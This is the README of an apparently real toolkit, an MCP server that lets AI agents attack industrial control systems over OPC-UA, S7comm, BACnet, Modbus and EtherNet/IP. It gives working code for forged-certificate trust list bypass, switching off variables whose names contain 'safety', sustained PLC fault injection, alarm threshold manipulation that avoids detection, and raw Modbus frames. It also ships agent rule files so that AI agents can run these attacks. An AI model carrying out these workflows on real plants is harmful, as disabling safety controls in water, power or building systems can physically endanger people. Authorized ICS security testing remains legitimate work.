# ICS Exploitation MCP

A comprehensive Model Context Protocol (MCP) server for Industrial Control Systems (ICS) security assessment. Supports multiple industrial protocols in a single unified toolkit.

## Validation

This MCP has been tested and validated against real-world ICS security assessment scenarios including:
- **OPC-UA**: Insecure trust list bypass, certificate generation, node enumeration, variable manipulation
- **S7comm**: PLC enumeration, memory read/write, sustained attacks, multi-offset fault injection
- **BACnet**: Building automation, HVAC manipulation, alarm bypass, persistent write attacks
- **Modbus**: PLC coil/register manipulation, ladder logic bypass, menu-driven CLI interfaces
- **EtherNet/IP**: CIP object enumeration, tag read/write, Allen-Bradley/Rockwell controllers

## Supported Protocols

| Protocol | Target Systems | Use Cases |
|----------|----------------|-----------|
| **OPC-UA** | Universal PLCs (Siemens, ABB, Rockwell, etc.) | SCADA systems, HMI interfaces |
| **S7comm** | Siemens S7 PLCs (S7-300/400/1200/1500) | Siemens-specific environments |
| **BACnet** | Building Automation Systems | HVAC, lighting, access control, fire detection |
| **Modbus** | Generic PLCs, RTUs, sensors | Water systems, power grids, manufacturing |
| **EtherNet/IP** | Allen-Bradley, Rockwell Automation | Industrial automation, CIP-based systems |

## Features

### OPC-UA Toolkit
- Security policy enumeration (None, Basic256Sha256, Basic256, Basic128Rsa15)
- Self-signed certificate generation for insecure trust list bypass
- Secure connection handling with all security modes
- Node hierarchy enumeration with access level detection
- Writable variable discovery (attack surface mapping)
- Variable read/write operations

### S7comm Toolkit
- Connection management with non-standard port support
- CPU and block enumeration
- Data block read/write operations
- Memory area operations (DB, PE, PA, MK, CT, TM)
- Sustained attack mode for maintaining fault conditions
- Multi-offset sustained attacks for 3+ simultaneous faults
- Type-aware writes with proper S7 encoding
- HMI status monitoring and correlation
- Memory mapping via systematic scanning
- Payload generation utilities

### BACnet Toolkit
- Menu-driven CLI connection
- Object enumeration (thermostats, sensors, alarms, doors)
- Property read/write operations
- **Persistent write attack** - bypasses safety thermostat resets
- Alarm threshold manipulation (OHAP) - prevents detection
- Writable object discovery
- Combined heat room attack (threshold + sustained write)

### Modbus Toolkit
- Menu-driven CLI connection for Modbus RTU interfaces
- Coil read/write operations (FC 01, 05)
- Register read/write operations (FC 03, 06)
- Raw command injection (hex-encoded Modbus frames)
- Coil scanning for attack surface discovery
- Status monitoring with JSON parsing
- Ladder logic bypass via mode switching

### EtherNet/IP Toolkit
- Connection to Allen-Bradley/Rockwell controllers
- LogixDriver and CIPDriver support (automatic fallback)
- Tag read/write operations by name
- Tag enumeration/listing
- CIP object access (class/instance/attribute)
- CIP object enumeration for hidden data discovery
- Automatic encoding detection (UTF-16-LE, UTF-8, ASCII)
- Device identity retrieval (vendor, product, serial)

## Installation

### From Source

```bash
# Clone the repository
git clone https://github.com/0xhackerfren/ICS-Explotation-MCP.git
cd ICS-Explotation-MCP

# Install dependencies
pip install -r requirements.txt
```

### Via pip (when published)

```bash
# Install with all protocols
pip install ics-exploitation-mcp[all]

# Install specific protocols only
pip install ics-exploitation-mcp[opcua]    # OPC-UA only
pip install ics-exploitation-mcp[s7]       # S7comm only
```

## Quick Start

### As Python Library

```python
from ics_exploitation_mcp import ICSExploitationMCP

mcp = ICSExploitationMCP()

# ===== OPC-UA Operations =====

# 1. Enumerate endpoints to find security requirements
endpoints = mcp.opcua.enumerate_endpoints("opc.tcp://192.168.1.100:4840")
print(f"Security policies: {endpoints['security_policies']}")
print(f"Recommendation: {endpoints['recommendation']}")

# 2. Generate certificates for secure connection
certs = mcp.opcua.generate_self_signed_cert("./certs")
print(f"Certificate: {certs['cert_path']}")

# 3. Connect with encryption (exploiting insecure trust list)
mcp.opcua.connect(
    url="opc.tcp://192.168.1.100:4840",
    cert_path=certs['cert_path'],
    key_path=certs['key_path'],
    security_policy="Basic256Sha256",
    security_mode="SignAndEncrypt"
)

# 4. Find attack surface - writable variables
writable = mcp.opcua.find_writable_variables()
print(f"Found {writable['count']} writable variables")

# 5. Manipulate PLC variables
mcp.opcua.write_variable("ns=2;i=38", "false", "Boolean")

# 6. Cleanup
mcp.opcua.disconnect()


# ===== S7comm Operations =====

# 1. Connect to PLC (note: some systems use non-standard ports)
mcp.s7.connect("192.168.1.1", rack=0, slot=0, port=36815)

# 2. Enumerate blocks
blocks = mcp.s7.list_blocks()
print(f"Data blocks: {blocks['blocks']['DB']}")

# 3. Read data block
data = mcp.s7.db_read(db_number=1, offset=0, size=100)
print(f"Data: {data['data_hex']}")

# 4. Write to data block
mcp.s7.db_write(db_number=1, offset=48, data="FF" * 8)

# 5. Sustained attack (for systems where faults reset)
result = mcp.s7.sustained_attack(
    db_number=1,
    offset=0,
    data="FF" * 128,
    duration_seconds=60,
    status_url="http://target:8080/status"
)

# 6. Disconnect
mcp.s7.disconnect()


# ===== BACnet Operations =====

# 1. Connect to BACnet CLI server (building automation)
mcp.bacnet.connect("192.168.1.1", 48103)

# 2. List all building automation objects
objects = mcp.bacnet.list_objects()
print(f"Found {objects['object_count']} objects")

# 3. Find writable objects
writable = mcp.bacnet.find_writable()
print(f"Found {writable['count']} writable objects")

# 4. Write to multiple objects at once
mcp.bacnet.write_multiple(writes=[
    {"object_type": "analogOutput", "object_id": 21, "value": 100},
    {"object_type": "multiStateOutput", "object_id": 102, "value": 2}
])

# 5. Sustained write to maintain state
result = mcp.bacnet.sustained_write(
    object_type="analogOutput",
    object_id=21,
    property_name="presentValue",
    value=100,
    duration_seconds=120,
    interval_seconds=2.0,
    status_url="http://target:8080/data"
)
print(f"Writes performed: {result['writes_performed']}")

# 6. Disconnect
mcp.bacnet.disconnect()


# ===== Modbus Operations =====

# 1. Connect to Modbus CLI interface
mcp.modbus.connect("192.168.1.1", 502)

# 2. Get system status
status = mcp.modbus.get_status()
print(f"Current state: {status}")

# 3. Write to coil (on/off control)
# Slave ID 82 (0x52), coil address 9947 = manual_mode
mcp.modbus.write_coil(address=9947, value=True, unit_id=82)

# 4. Write to register (numeric value)
mcp.modbus.write_register(address=100, value=255, unit_id=82)

# 5. Send raw Modbus command (hex string)
# Format: SlaveID + FunctionCode + Address + Value
mcp.modbus.send_modbus_raw("520526DBFF00")  # Enable manual mode

# 6. Disconnect
mcp.modbus.disconnect()


# ===== EtherNet/IP Operations =====

# 1. Connect to EtherNet/IP controller
mcp.ethernetip.connect("192.168.1.1", 44818)

# 2. Get device identity
identity = mcp.ethernetip.get_identity()
print(f"Device: {identity}")

# 3. Read tag (if LogixDriver available)
tag_value = mcp.ethernetip.read_tag("Status")

# 4. Read CIP object (low-level access)
# Class 0x02 = Message Router, Instance 1
result = mcp.ethernetip.read_cip_object(class_id=0x02, instance=1)
print(f"Decoded: {result['decoded']}")

# 5. Enumerate CIP objects to find hidden data
objects = mcp.ethernetip.enumerate_cip_objects()
for obj in objects['results']:
    if obj['decoded']:
        print(f"Found: {obj}")

# 6. Disconnect
mcp.ethernetip.disconnect()
```

### As MCP Server (Cursor IDE)

Add to your `.cursor/mcp.json`:

```json
{
  "mcpServers": {
    "ics-exploitation": {
      "command": "python",
      "args": ["/path/to/ics_exploitation_mcp.py"]
    }
  }
}
```

Restart Cursor, then use the tools in your AI assistant conversations.

### As MCP Server (Claude Desktop)

Add to your `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "ics-exploitation": {
      "command": "python",
      "args": ["/path/to/ics_exploitation_mcp.py"]
    }
  }
}
```

## Tool Reference

### General Tools (3)

| Tool | Description |
|------|-------------|
| `ics_check_installation` | Check installation status of all protocols |
| `ics_list_capabilities` | List all available tools |
| `ics_get_documentation` | Get protocol documentation |

### OPC-UA Tools (9)

| Tool | Description |
|------|-------------|
| `opcua_enumerate_endpoints` | Discover server security requirements |
| `opcua_generate_cert` | Generate self-signed certificate for trust list bypass |
| `opcua_connect` | Connect to OPC-UA server with security settings |
| `opcua_disconnect` | Disconnect from server |
| `opcua_enumerate_nodes` | List all nodes with access levels |
| `opcua_find_writable` | Find writable variables (attack surface) |
| `opcua_get_node_info` | Get detailed info about a specific node |
| `opcua_read` | Read variable value |
| `opcua_write` | Write value to variable |

### S7comm Tools (17)

| Tool | Description |
|------|-------------|
| `s7_connect` | Connect to Siemens S7 PLC |
| `s7_disconnect` | Disconnect from PLC |
| `s7_is_connected` | Check connection status |
| `s7_get_cpu_info` | Get CPU module information |
| `s7_get_cpu_state` | Get CPU run state (Run/Stop) |
| `s7_list_blocks` | List all PLC blocks |
| `s7_db_read` | Read from data block |
| `s7_db_write` | Write to data block |
| `s7_db_write_typed` | Type-aware write (UINT, REAL, etc.) |
| `s7_db_get_size` | Get data block size |
| `s7_read_area` | Read from memory area |
| `s7_write_area` | Write to memory area |
| `s7_sustained_attack` | Continuous writes for maintaining faults |
| `s7_sustained_attack_multi` | Multi-offset sustained attack |
| `s7_monitor_status` | Poll HMI/API for status changes |
| `s7_scan_db_effects` | Map memory offsets to equipment effects |
| `s7_generate_payload` | Generate test payload patterns |

### BACnet Tools (10)

| Tool | Description |
|------|-------------|
| `bacnet_connect` | Connect to BACnet CLI server |
| `bacnet_disconnect` | Disconnect from server |
| `bacnet_list_objects` | List all building automation objects |
| `bacnet_get_object_info` | Get detailed object information |
| `bacnet_read` | Read object property |
| `bacnet_write` | Write object property |
| `bacnet_find_writable` | Find writable objects (attack surface) |
| `bacnet_write_multiple` | Batch write to multiple objects |
| `bacnet_sustained_write` | Continuous write for auto-reset systems |

### Modbus Tools (10)

| Tool | Description |
|------|-------------|
| `modbus_connect` | Connect to Modbus CLI server |
| `modbus_disconnect` | Disconnect from server |
| `modbus_get_status` | Get system status (JSON) |
| `modbus_send_raw` | Send raw Modbus command (hex) |
| `modbus_write_coil` | Write single coil (FC 05) |
| `modbus_write_register` | Write single register (FC 06) |
| `modbus_read_coils` | Read coils (FC 01) |
| `modbus_read_registers` | Read holding registers (FC 03) |
| `modbus_scan_coils` | Scan coils for effects |
| `modbus_scan_write_coils` | Scan and write to coil range |

### EtherNet/IP Tools (8)

| Tool | Description |
|------|-------------|
| `ethernetip_connect` | Connect to EtherNet/IP controller |
| `ethernetip_disconnect` | Disconnect from controller |
| `ethernetip_get_identity` | Get device identity (vendor, product, serial) |
| `ethernetip_read_tag` | Read PLC tag by name |
| `ethernetip_write_tag` | Write value to PLC tag |
| `ethernetip_list_tags` | List all available tags |
| `ethernetip_read_cip_object` | Read CIP object (class/instance/attribute) |
| `ethernetip_enumerate_objects` | Scan for CIP objects |

## Security Concepts

### OPC-UA Security Policies

| Policy | Encryption | Signature | Notes |
|--------|------------|-----------|-------|
| None | - | - | Insecure, no protection |
| Basic128Rsa15 | AES-128 | RSA-SHA1 | Legacy, deprecated |
| Basic256 | AES-256 | RSA-SHA1 | Legacy, deprecated |
| Basic256Sha256 | AES-256 | RSA-SHA256 | Recommended |

### OPC-UA Security Modes

| Mode | Description |
|------|-------------|
| None | No security (plaintext) |
| Sign | Messages signed but not encrypted |
| SignAndEncrypt | Full encryption and signing |

### Insecure Trust List Vulnerability

Many OPC-UA servers are configured with "insecure trust lists" - they accept **any** client certificate without validation:

1. Generate a self-signed certificate with `opcua_generate_cert`
2. Connect with encryption using the fake certificate
3. Server accepts the certificate without verification
4. Full authenticated access to the PLC

### OPC-UA Access Level Bits

| Bit | Value | Meaning |
|-----|-------|---------|
| 0 | 0x01 | CurrentRead - Can read current value |
| 1 | 0x02 | CurrentWrite - **Can write current value** |
| 2 | 0x04 | HistoryRead - Can read history |
| 3 | 0x08 | HistoryWrite - Can write history |

Variables with bit 1 set (access_level & 0x02) are writable and represent the primary attack surface.

### S7comm Memory Areas

| Area | Code | Description |
|------|------|-------------|
| DB | 0x84 | Data Blocks - Primary storage |
| PE | 0x81 | Process Inputs - Sensor data |
| PA | 0x82 | Process Outputs - Actuator control |
| MK | 0x83 | Markers/Flags - Internal state |
| CT | 0x1C | Counters |
| TM | 0x1D | Timers |

### S7comm Connection Parameters

| PLC Type | Rack | Slot |
|----------|------|------|
| S7-300 | 0 | 0 |
| S7-400 | 0 | 1 |
| S7-1200 | 0 | 0 |
| S7-1500 | 0 | 0 |

**Note**: Some systems use non-standard ports. Always verify the correct port for your target.

## Common Attack Patterns

### Pattern 1: OPC-UA Trust List Bypass

```python
mcp = ICSExploitationMCP()

# Enumerate to find security requirements
endpoints = mcp.opcua.enumerate_endpoints("opc.tcp://target:4840")

# Generate fake certificate
certs = mcp.opcua.generate_self_signed_cert("./certs")

# Connect with encryption using fake cert
mcp.opcua.connect(
    "opc.tcp://target:4840",
    certs['cert_path'], certs['key_path'],
    "Basic256Sha256", "SignAndEncrypt"
)

# Find and exploit writable variables
writable = mcp.opcua.find_writable_variables()
for var in writable['variables']:
    if 'safety' in var['path'].lower():
        mcp.opcua.write_variable(var['node_id'], "false", "Boolean")
```

### Pattern 2: S7 Memory Mapping

```python
mcp = ICSExploitationMCP()
mcp.s7.connect("target", 0, 0, 36815)

# Map which bytes affect which equipment
result = mcp.s7.scan_db_effects(
    db_number=1,
    status_url="http://target:8080/status",
    start_offset=0,
    end_offset=128
)

# Result shows: offset 48-55 controls temperature
# offset 32-39 controls speed, etc.
print(result['offset_map'])
```

### Pattern 3: Sustained Fault Injection

```python
mcp = ICSExploitationMCP()
mcp.s7.connect("target", 0, 0, 36815)

# Generate maximum value payload
payload = mcp.s7.generate_payload("all_max", 128)

# Continuously write to maintain fault (auto-monitors for success)
result = mcp.s7.sustained_attack(
    db_number=1,
    offset=0,
    data=payload['payload'],
    duration_seconds=120,
    interval_ms=200,
    status_url="http://target:8080/status"
)

if result['success']:
    print(f"Attack successful: {result['max_faults']} faults detected")
```

## Troubleshooting

### OPC-UA Issues

| Issue | Solution |
|-------|----------|
| Connection refused | Check port (default 4840), verify target is OPC-UA server |
| Security policy mismatch | Use `enumerate_endpoints` to find supported policies |
| Certificate rejected | Server may have secure trust list (not vulnerable) |
| Timeout | Increase timeout, check network connectivity |

### S7comm Issues

| Issue | Solution |
|-------|----------|
| TCP : Unreachable peer | Wrong IP or port, check network |
| Address out of range | Use `db_get_size()` to check block size |
| Item not available | DB doesn't exist, use `list_blocks()` |
| Connection lost | Use `sustained_attack` which auto-reconnects |

### General Issues

| Issue | Solution |
|-------|----------|
| Import error: opcua | `pip install opcua` |
| Import error: snap7 | `pip install python-snap7` |
| MCP not loading | Check path in mcp.json, restart Cursor |
| No protocols available | Install at least one: opcua or python-snap7 |

## Requirements

### Core
- Python 3.8+

### OPC-UA Protocol
- opcua >= 0.98.0
- cryptography >= 41.0.0

### S7comm Protocol
- python-snap7 >= 1.3

### EtherNet/IP Protocol
- pycomm3 >= 1.2.0

### MCP Server Mode
- mcp >= 1.0.0

### Modbus Protocol
- No additional dependencies (uses standard socket library)

### BACnet Protocol
- No additional dependencies (uses standard socket library)

### Status Monitoring (Optional)
- requests >= 2.25.0

## Examples

See the `examples/` directory:
- `basic_enumeration.py` - OPC-UA endpoint discovery
- `exploit_reactor.py` - Full OPC-UA exploitation workflow
- `s7_basic_usage.py` - S7comm basic operations
- `s7_memory_scan.py` - Memory mapping with HMI correlation
- `combined_ics_attack.py` - Multi-protocol attack scenario

## Documentation

For AI agent integration, the following documentation files are included:

| File | Purpose |
|------|---------|
| [SKILL.md](SKILL.md) | Agent skill with step-by-step workflows for all protocols |
| [commands.md](commands.md) | Complete reference for all 58 tools with parameters and examples |
| [rules.mdc](rules.mdc) | Cursor rule for agent decision-making on when/how to use tools |

### Using with AI Agents

1. **Cursor IDE**: Copy `rules.mdc` to `.cursor/rules/` for automatic agent guidance
2. **Skills**: Reference `SKILL.md` for workflow-based exploitation patterns
3. **Tool Reference**: Use `commands.md` as complete API documentation

## Ethical Use

This toolkit is intended for:
- **Authorized penetration testing**
- **Security competitions and exercises**
- **Security research**
- **Educational purposes**

**WARNING**: Do not use against systems without explicit authorization. Unauthorized access to industrial control systems is illegal and potentially dangerous.

## Credits

- Built on [python-opcua](https://github.com/FreeOpcUa/python-opcua)
- Built on [python-snap7](https://github.com/gijzelaerr/python-snap7)
- Built on [pycomm3](https://github.com/ottowayi/pycomm3)
- MCP protocol via [mcp](https://github.com/anthropics/mcp)

## License

MIT License - See [LICENSE](LICENSE) file.
